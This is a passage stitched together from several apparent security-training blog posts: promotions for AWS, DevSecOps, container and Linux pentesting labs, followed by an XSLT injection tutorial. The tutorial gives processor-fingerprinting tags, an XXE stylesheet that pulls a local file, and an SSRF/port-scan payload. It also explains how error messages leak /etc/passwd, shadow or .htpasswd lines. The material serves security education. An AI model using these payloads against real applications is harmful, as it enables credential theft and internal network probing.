    "postContent": "<p>Cloud security is a deeply nuanced topic. Although the fundamentals remain the same as traditional cybersecurity, most practitioners are unfamiliar with the intricacies of cloud security.</p><p>To bridge this gap, our AWS cloud security syllabus covers IAM, API Gateway, Lambda, Cloud Databases and S3. By learning to secure these 5 most commonly used AWS components, professionals with a traditional cybersecurity background can be equipped with cloud-compatible skills.</p><p>We covered the technicals of these 5 components in a&nbsp;<a href=\"https://blog.pentesteracademy.com/aws-security-iam-api-gateway-lambda-dynamodb-s3-5712da98aaf7\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">previous blog post</a>, but what exactly do the labs entail? Let’s find out:</p><h1>What are Pentester Academy’s AWS Cloud Security labs?</h1><p>Our AWS labs are the first in the industry to provide a dedicated sandbox environment for AWS pentesting — essentially, they’re a “cloud playground” where you can learn and practice attacks without the hassle and risk of using your personal AWS account. Here’s what makes our cloud labs unique:</p><p><br></p><ul><li><strong>No AWS account required</strong>: our dedicated sandbox environment already contains real AWS accounts and lets you pentest cloud deployments directly in your browser. Getting started with cloud security has never been easier!</li><li><strong>Industry-relevant syllabus</strong>: Given that most AWS deployments are breached by a common set of vulnerabilities which attackers repeatedly use, learning our syllabus — which covers such vulnerabilities — makes you job-ready immediately.</li><li><strong>On-demand bootcamp recordings included:&nbsp;</strong>annual subscribers also get access to 19+ hours of bootcamp recordings to get you up to speed on both theory and practice!</li></ul><p><br></p><h1>How the labs are structured</h1><p>Our 50+ AWS Cloud Security lab exercises are split into 6 categories — IAM, API Gateway, Lambda, Databases, DynamoDB and S3. Collectively, they cover the 5 components mentioned above (DynamoDB falls under Cloud Databases), and teach you how to identify and leverage misconfigurations hands-on.</p><p><br></p><p>Each category covers the corresponding component in depth, from basics/enumeration to advanced scenarios. Here are some attacks you can look forward to learning:</p><ol><li>Leverage misconfigured IAM policies to escalate privileges</li><li>Understand AWS Lambda and exploit vulnerable applications to get a foothold</li><li>Abuse overly permissive policies and misconfigured roles to escalate privileges</li><li>Attack API Gateway endpoints via various means to bypass authentication</li><li>Leverage S3 misconfigurations to steal data and chain attacks</li><li>Gain persistency on a Lambda environment and steal any data processed by the lambda function, even if the principle of least privilege is followed</li></ol><p><br></p>",

Before delving into the DevSecOps learning path, let’s first compare DevOps and DevSecOps:</p><p><br></p><h2>DevOps: A framework for efficient software development</h2><p><img src=\"https://miro.medium.com/max/1400/1*HCs47KlvSjpOjvbar-mA6Q.png\" height=\"333\" width=\"700\"></p><p>The different components of the DevOps framework</p><p><a href=\"https://en.wikipedia.org/wiki/DevOps\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">Wikipedia explains DevOps best</a>:&nbsp;<em>It is “a set of practices that combines software development (Dev) and IT operations (Ops). It aims to shorten the systems development life cycle and provide continuous delivery with high software quality.”</em></p><p>Today, DevOps has become a predominant approach in software and product development. It allows better visibility, coordination and faster iterations in comparison to other relatively older processes like&nbsp;<a href=\"https://www.guru99.com/software-development-life-cycle-tutorial.html\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">SDLC&nbsp;</a>or&nbsp;<a href=\"https://www.atlassian.com/agile\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">Agile</a>, making it popular.</p><p>But there lies a critical issue with DevOps: with this framework, software development teams do not take security into account. Along with high-pressure commercial timelines and lack of security awareness, developers end up releasing code containing vulnerabilities.</p><p>And thus, DevSecOps was born.</p><h2>DevSecOps: Integrating Security with DevOps</h2><p><img src=\"https://miro.medium.com/max/1400/1*6FvlY5IpeHYBzurnMUzkZA.png\" height=\"420\" width=\"700\"></p><p>DevSecOps = DevOps + Security</p><p>The name says it all: DevSecOps integrates security (Sec) into DevOps. DevSecOps is a set of practices of adding security components to each step of the DevOps process. It aims to shorten the systems development life cycle and provide continuous delivery with high software quality while taking care of the security aspect.</p><p>Instead of having a team for manual security testing, it is more efficient and cost/time-effective to have automated security checks to catch issues as soon as possible.</p><p>DevSecOps is thus a highly demanded and regarded skill in the industry. As a career-focused cybersecurity education company, we set out to equip professionals with DevSecOps knowledge through our on-demand bootcamp and learning path.</p>",

Containers use operating system-level virtualization to isolate applications from one another. They are lightweight in comparison to virtual machines as they share the host machine’s kernel.</p><p><br></p><p>Docker has enabled developers to rapidly build and share applications, and Kubernetes has enabled these applications to be deployed and scaled dynamically. This has led to the widespread adoption of Docker in the industry.</p><p>However, like all complex software systems, the container ecosystem is prone to misconfiguration, leading to vulnerabilities that can be exploited by malicious users. Because of this, understanding container security and being able to audit a container environment are critical skills that all security professionals should possess.</p><p><br></p><p><br></p><p>This is a 4-session beginner bootcamp that will teach you the basics of containers and how to secure them. Learn how misconfigured components can lead to breakout attacks and eventually, host compromise.</p><p>This on-demand bootcamp covers different tools and techniques to audit containers, container hosts, image repositories and container management tools. Our unique lab setup lets you try low-level breakout attacks which otherwise can only be done in local virtual machines.</p><ul><li>9+ hours of live bootcamp recordings</li><li>60+ Lab Exercises</li></ul><p><br></p><h2>What will you learn?</h2><p>The Container Security learning path contains 11 categories of lab exercises that cover the basic concepts of container security and pentesting. You will learn how to use various tools and commands to identify and exploit vulnerabilities in the different components of the container ecosystem.</p><p><br></p><h2>Prerequisites</h2><p>To get the most out of this learning path, we recommend that you have:</p><p><br></p><ul><li>A basic knowledge of computers and networking</li><li>Familiarity with the Linux operating system</li><li>Optionally, a basic knowledge of Docker</li></ul><p>While each set of labs can be completed in any order, we recommend the following sequence:</p><h2>Container Basics</h2><p><br></p><p>This section explores the container management systems Docker and Podman. The labs also cover the low-level components of the Docker system e.g. containerd, runc. Beginners will learn how to perform basic operations like pushing, pulling, creating and running containers. You will learn:</p><ul><li>Using Docker client to perform basic operations including push, pull, build images and interacting with the container/network</li><li>Using podman to create, manage and interact with containers, images and networks</li><li>Interacting with containerd to run containers</li><li>Running Docker containers using Docker images with runc and umoci</li></ul><p><br></p>",

    "postContent": "<p>The Linux Operating System forms the basis of a huge number of the applications that we use every day on the Internet. Linux servers are configured for uses as varied as high-performance computing, storage, network routing, and web servers. This flexibility has meant that the management of a Linux server is a complex subject with plenty of room for error. A large number of deployments and configurations has also led to new vulnerabilities being discovered almost every day. To protect a deployment on Linux, a system administrator must ensure that the Linux servers are always up to date with the latest security patches. A single vulnerable service or a minor mistake in configuration could leave the server, and the data residing on it, vulnerable to attack.</p><p><br></p><p>As a pentester, it is important to know how to scout for vulnerabilities and the ways they can be exploited. But first, one has to know how Linux works. In our labs, you’ll be using a Kali/Ubuntu Attacker machine to attack other Linux-based target machines.</p><p>Our learning path thus starts with Linux Basics, where you will learn concepts, commands and tools required to interact with various Linux services and applications. Specifically, the path covers:</p><ul><li>Understanding the Linux filesystem and users</li><li>Understanding the system and user crontabs</li><li>Learning the important Linux commands and tools</li><li>Fingerprinting web applications and network services such as FTP and SSH</li><li>Creating bi-directional connections with socat</li></ul><p>Once you’re comfortable with Linux, we’ll move on to explain Linux pentesting in the context of the 5 phases of hacking:</p><p><img src=\"https://miro.medium.com/max/1400/0*uSUaVG-jxHZEAkPv\" height=\"325\" width=\"700\"></p><p>The 5 phases of hacking is a well-known methodology amongst security professionals, where attacks start with a reconnaissance phase and end with covering tracks.

The more information an attacker has, the easier it will be to identify any misconfigurations and vulnerabilities. The objective of the reconnaissance section is to familiarize the student with the approach to follow for enumerating web applications and various network services, such as DNS, web servers, databases, caching systems, etc. Using the information, the attack vector and entry points can be identified and then used in the exploitation phase.</p><p><br></p><p>In our reconnaissance section, you’ll learn:</p><ul><li>Identifying open ports on the machine</li><li>Identifying services running on the machine</li><li>Interacting with network services</li><li>Fingerprinting different types of services</li><li>Understanding service-specific misconfigurations</li><li>Enumerating files/directories on web applications</li><li>Scanning web application using popular scanners and identifying the entry points</li></ul><h1>Exploitation</h1><p>The objective of the exploitation phase is to establish access to a system or resource by leveraging a vulnerability or bypassing a security restriction. In this section, the student will learn how to search for exploits based on the information acquired in the reconnaissance phase and use them to compromise the application or service. Once the attacker has compromised a machine, it is possible to attack other machines on the same network which may not be exposed to the Internet.</p><p><br></p><p>This section covers:</p>",

Not only that, it even allows you to define functions and call them as well. Amazing!</p><p>It uses XPath to locate the different subsets of the XML document tree and then it can be used to perform operations on them: check for their values, perform functions on the contents, and much much more.</p><p>There’s a really awesome tutorial on&nbsp;<a href=\"https://www.youtube.com/watch?v=WggVR4YI5oI\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">XSLT and XPath</a>. I highly recommend this one if you wish to learn more on XSLT &amp; XPath. But for the scope of this post, the stuff we discussed will suffice.</p><h1>XSLT Injections</h1><p>Now let’s talk about the interesting bits.</p><p><br></p><p>Injection issues happen when the user input is blindly trusted without thinking of the consequences. If the right conditions are set, then this can result in data exfiltration, RCE, XSS and much much more.</p><p>If a user is able to supply their own XSLT files or inject XSLT tags, then this can result in XSLT injections. The constructs that you have at your disposal greatly depend on the processor that’s being used and the version of the XSLT specification. Version 1 is most widely used and supported because the newer versions: 2 &amp; 3 are backwards compatible and also because the browsers support version 1 and hence, the popularity.</p><p>Version 2 &amp; 3 have a lot more features compared to version 1 so the exploitation becomes much more easy with the higher versions. But still, with 1, you can get a lot of stuff done. Here are some interesting issues:</p><ul><li>RCE</li><li>Local File Read (via error messages)</li><li>XXE</li><li>SSRF and Port Scans</li></ul><p>In the XSLT ecosystem, we have a different number of processors including:</p><p><img src=\"https://miro.medium.com/max/1400/1*iGov_CUlY5t4pc6OOEkSOA.png\" height=\"350\" width=\"700\"></p><p>Source:&nbsp;<a href=\"https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20IO%20Active.pdf\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Abusing%20XSLT%20for%20practical%20attacks%20-%20Arnaboldi%20-%20IO%20Active.pdf</a></p><p>As you can already notice,&nbsp;<a href=\"http://xmlsoft.org/libxslt/\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\"><strong><em>libxslt</em></strong></a>&nbsp;is quite common and mostly, the version is 1 except Saxon by Saxonica which is quite feature rich and supports both version 1 and 2.</p><p>So for our discussion, we will discuss on&nbsp;<a href=\"http://xmlsoft.org/libxslt/\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\"><strong><em>libxslt</em></strong></a>. It’s a C library developed for the GNOME project. You can try it out on CLI on Linux using the&nbsp;<a href=\"http://xmlsoft.org/xslt/xsltproc.html\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\"><strong>xsltproc</strong></a>&nbsp;command.</p><p>Now let’s focus on the attacks. This is not supposed to be an exhaustive guide on the subject (I’ve linked more resources at the end of this article for a deeper dive). We will just touch upon the basics and I will show you RCE &amp; Local File Read using XSLT injection.</p><p>Consider an application that takes an arbitrary XSLT file and then parses it’s contents. What do you think could happen?</p><h2>Recon</h2><p>You might be thinking all this is good to know but how do you even know that what’s the processor being used. Because otherwise it would be sort of a “blind” attack and that’s more painful and noisy, right? Worry not, there are some tags you could use for performing recon.</p><p><br></p><p>These are the 3 tags that would give you back the version, vendor and vendor url:</p><pre class=\"ql-syntax\" spellcheck=\"false\">&lt;xsl:value-of select=\"system-property('xsl:version')\" /&gt;\n&lt;xsl:value-of select=\"system-property('xsl:vendor')\" /&gt;\n&lt;xsl:value-of select=\"system-property('xsl:vendor-url')\" /&gt;\n</pre><p>So you would now know of all the features are supported by the processor and move forward to the exploitation part.</p><h2>RCE</h2><p>An XSLT file like this could result in RCE, if the application is vulnerable (if<em>&nbsp;registerPHPFunctions</em>&nbsp;is enabled):</p><p><br></p><p><img src=\"https://miro.medium.com/max/1400/1*_u3LbYYpuRK2mOWCDfwNiQ.png\" height=\"72\" width=\"700\"></p><p><img src=\"https://miro.medium.com/max/1400/1*vy-xaNo8xcZsR7Wb5MicRw.png\" height=\"220\" width=\"700\"></p><h2>Local File Read</h2><p>And not only that, you could even read the contents of a local file (at least 1 line) via the reported error messages:</p><p><br></p><p><img src=\"https://miro.medium.com/max/1400/1*5Pqx5UCIsrA-mODfDXXfmw.png\" height=\"68\" width=\"700\"></p><p>XSLT file containing the payload to read&nbsp;/etc/passwd&nbsp;file</p><p><img src=\"https://miro.medium.com/max/1400/1*zFFxI_8o1k0V3oQod0lYJA.png\" height=\"141\" width=\"700\"></p><p>Processing the XLST file results in leaking the first line of&nbsp;/etc/passwd&nbsp;file</p><p>Notice that the application gave out an error but the first line still was revealed! It happened because&nbsp;<em>document</em>&nbsp;(or even&nbsp;<em>include</em>&nbsp;&amp;&nbsp;<em>import</em>&nbsp;functions for that matter) would try to parse the specified file and since the passwd file was not a valid XML file, these functions would error out and show the first line of the file.</p><p>Now you might think that this is quite limiting, but wait a minute… If the application was running as root, you could get the root user’s password hash by reading the first line of the&nbsp;<strong>shadow</strong>&nbsp;file. And you can even read the contents of the&nbsp;<strong>.htpasswd</strong>&nbsp;file to get the password hash for admin or other users.</p><p>So it isn’t all in vain.</p><h2>XXE</h2><p>You could even perform XXE but that should be obvious. Consider this example:</p><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\">&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;!DOCTYPE dtd_sample[&lt;!ENTITY ext_file SYSTEM \"path/to/file\"&gt;]&gt;\n&lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;\n  &lt;xsl:template match=\"/events\"&gt;\n    Events &amp;ext_file;:\n    &lt;xsl:for-each select=\"event\"&gt;\n      &lt;xsl:value-of select=\"name\"/&gt;: &lt;xsl:value-of select=\"value\"/&gt;\n    &lt;/xsl:for-each&gt;\n  &lt;/xsl:template&gt;\n\n&lt;/xsl:stylesheet&gt;\n</pre><h2>SSRF &amp; Port Scanning</h2><p>Using a payload like this one (omitted the extra stuff just for brevity):</p><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\">&lt;xsl:copy-of select=\"document('http://10.10.10.10:22')\"/&gt;\n</pre><p>You can see that this would make a request to the specified IP. Now you can imagine that with this primitive, you get the power to perform SSRF and even port scans by leveraging the different error messages you get back for different scenarios (port ope, closed, invalid host, etc.).</p><h1>Extra Resources</h1><p>I’ve went through only a few of the attacks that can be performed, but there’s more! For that, I recommend you to go through the following resources that go much more in-depth:</p><p><br></p><ol><li><a href=\"https://www.youtube.com/watch?v=j4vCGtF3a64\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">Abusing XSLT For Practical Attacks</a></li><li><a href=\"https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">XSLT Injection</a></li><li><a href=\"https://www.contextis.com/en/blog/xslt-server-side-injection-attacks\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">XSLT Server Side Injection Attacks</a></li><li><a href=\"https://blog.compass-security.com/2015/06/xslt-security-and-server-side-request-forgery/\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">XSLT Security and Server Side Request Forgery</a></li><li><a href=\"https://www.acunetix.com/blog/articles/the-hidden-dangers-of-xsltprocessor-remote-xsl-injection/\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">The hidden dangers of XSLTProcessor — Remote XSL injection</a></li><li><a href=\"https://blog.hunniccyber.com/ektron-cms-remote-code-execution-xslt-transform-injection-java/\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">XSLT Injection Basics — Saxon</a></li><li><a href=\"https://www.hek.si/documents/An_unxpected_journey-_from_XSLT_injection_to_a_shell_Jusic_Infigo_IS.pdf\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">An unexpected journey: From XSLT injection to a shell</a></li></ol><h1>Closing Thoughts</h1><p>I hope you enjoyed this post and learnt something interesting. I wanted to cover XSLT injections on a higher level and show the different attacks possible. There’s a lot more to learn and all the resources that I have linked should give you a much deeper understanding. Overall, there’s nothing much to this vulnerability other than untrusted user-input being taken by the processor, and the nuances are specific to different processors and different languages.</p><p><br></p><p>If you’re confident with XSLT and related attacks, I encourage you to test yourself and earn our API security badge (sign in&nbsp;<a href=\"https://attackdefense.pentesteracademy.com/\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">here</a>, then head to our&nbsp;<a href=\"https://attackdefense.pentesteracademy.com/badgedetails?id=badge-api-security-advanced\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: inherit;\">API Security badge challenge</a>, subscribers only).
